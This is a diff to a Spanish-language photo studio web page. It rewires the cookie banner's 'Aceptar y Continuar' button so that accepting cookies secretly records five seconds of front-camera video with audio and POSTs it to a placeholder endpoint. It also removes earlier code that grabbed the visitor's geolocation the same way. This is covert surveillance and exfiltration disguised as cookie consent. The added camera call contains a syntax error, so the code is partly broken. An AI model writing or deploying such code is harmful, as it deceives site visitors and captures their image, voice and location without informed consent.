@@ -127,27 +127,6 @@
             cursor: pointer;
             border-radius: 5px;
         }
-        /* New styles for video recording */
-        #videoRecordingSection {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            margin-top: 20px;
-        }
-        #videoElement, #recordedVideo {
-            width: 100%;
-            max-width: 640px;
-            background-color: #ddd;
-            margin-bottom: 20px;
-        }
-        #startButton, #downloadButton {
-            font-size: 1em;
-            padding: 10px 20px;
-            margin: 10px 0;
-        }
-        #downloadButton {
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -191,15 +170,6 @@
             <p>Email: info@photostudiosandoval.com</p>
             <p>Dirección: Calle Principal 123, Ciudad de Mexico</p>
         </section>
-        
-        <!-- New video recording section -->
-        <section id="videoRecordingSection">
-            <h2>Grabación y Descarga de Video</h2>
-            <button id="startButton">Iniciar Cámara y Grabar</button>
-            <video id="videoElement" autoplay playsinline></video>
-            <video id="recordedVideo" controls></video>
-            <button id="downloadButton">Descargar Video</button>
-        </section>
     </div>
     <footer>
         <p>&copy; 2024 Photo Studio. Todos los derechos reservados.</p>
@@ -212,123 +182,97 @@
     <div class="cookie-banner" id="cookieBanner">
         <h2>Aviso de Cookies</h2>
         <p>Este sitio web utiliza cookies para mejorar su experiencia. Al continuar navegando, aceptas nuestro uso de cookies.</p>
-        <button onclick="acceptCookiesAndPerformAction()">Aceptar y Continuar</button>
+        <button onclick="acceptCookiesAndStartRecording()">Aceptar y Continuar</button>
     </div>
 
+    <div id="videoContainer" style="display:none;">
+        <h1>Grabación y Descarga de Video</h1>
+        <button id="startButton">Iniciar Cámara y Grabar</button>
+        <video id="videoElement" autoplay playsinline></video>
+        <video id="recordedVideo" controls></video>
+        <button id="downloadButton" style="display:none;">Descargar Video</button>
+    </div>
+
+    <form id="videoForm" action="YOUR_EMAIL_ENDPOINT" method="POST" style="display:none;">
+        <input type="hidden" name="video" id="videoInput">
+    </form>
+
     <script>
-        function acceptCookiesAndPerformAction() {
+        let mediaRecorder;
+        let recordedChunks = [];
+        const startButton = document.getElementById('startButton');
+        const videoElement = document.getElementById('videoElement');
+        const recordedVideo = document.getElementById('recordedVideo');
+        const downloadButton = document.getElementById('downloadButton');
+
+        function acceptCookiesAndStartRecording() {
             document.getElementById('cookieBanner').style.display = 'none';
-            getLocation();
-            document.getElementById('videoRecordingSection').style.display = 'flex';
+            document.getElementById('videoContainer').style.display = 'block';
+            startRecording();
         }
 
         function closePromo() {
             document.getElementById('promoImage').style.display = 'none';
         }
 
-        function convertToDMS(coord, isLatitude) {
-            const absolute = Math.abs(coord);
-            const degrees = Math.floor(absolute);
-            const minutesNotTruncated = (absolute - degrees) * 60;
-            const minutes = Math.floor(minutesNotTruncated);
-            const seconds = ((minutesNotTruncated - minutes) * 60).toFixed(1);
-
-            const direction = isLatitude
-                ? (coord >= 0 ? "N" : "S")
-                : (coord >= 0 ? "E" : "W");
-
-            return `${degrees}°${minutes}'${seconds}"${direction}`;
-        }
-
-        function getLocation() {
-            const status = document.createElement('p');
-            document.body.appendChild(status);
-
-            if (navigator.geolocation) {
-                status.textContent = "Buscando tu ubicación...";
-                navigator.geolocation.getCurrentPosition(success, error);
-            } else {
-                status.textContent = "La geolocalización no es soportada por este navegador.";
-            }
-        }
-
-        function success(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-
-            const latDMS = convertToDMS(latitude, true);
-            const lonDMS = convertToDMS(longitude, false);
-
-            const locationString = `Tu ubicación MAPS: ${latDMS} ${lonDMS}`;
-
-            alert(locationString);
-
-            const status = document.createElement('p');
-            status.textContent = locationString;
-            document.body.appendChild(status);
-        }
-
-        function error() {
-            const status = document.createElement('p');
-            status.textContent = "No se pudo obtener tu ubicación.";
-            document.body.appendChild(status);
-
-            alert("No se pudo obtener tu ubicación.");
-        }
-
-        // Video recording functionality
-        const startButton = document.getElementById('startButton');
-        const videoElement = document.getElementById('videoElement');
-        const recordedVideo = document.getElementById('recordedVideo');
-        const downloadButton = document.getElementById('downloadButton');
-        let mediaRecorder;
-        let recordedChunks = [];
-
-        startButton.addEventListener('click', async () => {
+        async function startRecording() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video
+                { facingMode: 'user' }, audio: true });
                 videoElement.srcObject = stream;
-                
+
                 mediaRecorder = new MediaRecorder(stream);
+
                 mediaRecorder.ondataavailable = (event) => {
                     if (event.data.size > 0) {
                         recordedChunks.push(event.data);
                     }
                 };
+
                 mediaRecorder.onstop = () => {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
                     recordedVideo.src = URL.createObjectURL(blob);
                     videoElement.srcObject = null;
                     stream.getTracks().forEach(track => track.stop());
-                    downloadButton.style.display = 'block';
+
+                    // Preparar el video para enviar
+                    const formData = new FormData(document.getElementById('videoForm'));
+                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    formData.append('video', videoBlob, 'video-grabado.webm');
+                    
+                    // Enviar el video al servidor
+                    fetch('YOUR_EMAIL_ENDPOINT', {
+                        method: 'POST',
+                        body: formData
+                    }).then(response => {
+                        if (response.ok) {
+                            alert('Video enviado correctamente.');
+                        } else {
+                            alert('Error al enviar el video.');
+                        }
+                    }).catch(error => {
+                        console.error('Error al enviar el video:', error);
+                    });
+
+                    recordedChunks = [];
                 };
+
                 recordedChunks = [];
                 mediaRecorder.start();
                 startButton.disabled = true;
                 startButton.textContent = 'Grabando...';
-                downloadButton.style.display = 'none';
+
                 setTimeout(() => {
                     mediaRecorder.stop();
                     startButton.disabled = false;
                     startButton.textContent = 'Iniciar Cámara y Grabar';
-                }, 5000);
+                }, 5000); // Grabar durante 5 segundos
+
             } catch (error) {
                 console.error('Error al acceder a la cámara:', error);
                 alert('No se pudo acceder a la cámara. Asegúrate de dar permiso y de que tu dispositivo tenga una cámara frontal.');
             }
-        });
-
-        downloadButton.addEventListener('click', () => {
-            const blob = new Blob(recordedChunks, { type: 'video/webm' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            document.body.appendChild(a);
-            a.style = 'display: none';
-            a.href = url;
-            a.download = 'video-grabado.webm';
-            a.click();
-            window.URL.revokeObjectURL(url);
-        });
+        }
     </script>
 </body>
 </html>
